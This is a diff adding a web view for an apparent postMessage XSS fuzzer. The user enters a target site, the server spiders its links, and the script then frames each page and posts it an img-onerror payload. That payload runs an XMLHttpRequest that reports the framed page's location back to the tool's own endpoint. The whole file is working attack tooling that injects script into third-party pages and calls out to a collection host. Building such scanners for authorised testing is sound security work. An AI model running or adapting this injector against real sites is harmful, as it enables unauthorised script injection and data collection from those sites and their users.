@@ -1,0 +1,61 @@
+.message
+  .alert.alert-info
+%form.well#spider-form
+  .form-group
+    %label{:for => "url-field"} Target
+    %input.form-control#url-field{type: "text", placeholder: "Enter URL to spider"}
+  .form-group
+    %button#start-spider Spider
+
+%form.well#fuzz-form
+  .form-group
+    %button#start-fuzzer Fuzz!
+
+%iframe#target{name: "target"}
+
+:javascript
+  $('iframe#target').hide();
+  $('.message').hide();
+  var target = '';
+  var locations = [];
+  var index = 0;
+  var payload = "z=new window.XMLHttpRequest();console.log(z);z.open('post','"+location.href+"report',true);z.setRequestHeader('Content-type','application/x-www-form-urlencoded');z.send('location='+escape(location));"
+  
+  $(document).ready(function() {
+    $('#fuzz-form').hide();
+  });
+
+  $('#start-spider').click(function(e) {
+    e.preventDefault();
+    var url = $('#url-field').val();
+    target = url.match(/(https?:\/\/[a-z0-9._:-]*)\/?/i)[1];
+    $.post('/spider', {url: url}, function(data) {
+      $('#fuzz-form').show();
+      locations = data.urls;
+      index = 0;
+      $('.message').show();
+      $('.alert').text('Spidering complete');
+    });
+  });
+
+  $('#start-fuzzer').click(function(e) {
+    $('iframe#target').show();
+    e.preventDefault();
+    loadFrame(locations[index++]);
+  });
+
+  $('iframe#target').load(function() {
+    var frame = window.frames[0];
+    if (typeof(frame) !== "undefined") {
+      frame.postMessage('<img src="a" onerror="'+payload+'">', target);
+      setTimeout('loadFrame(locations[index++])', 2000);
+    }
+  });
+
+  function loadFrame(url) {
+    if (typeof(url) !== "undefined") {
+      $('iframe#target').attr('src', url);
+    } else {
+      $('.alert').text('Fuzzing complete');
+    }
+  }
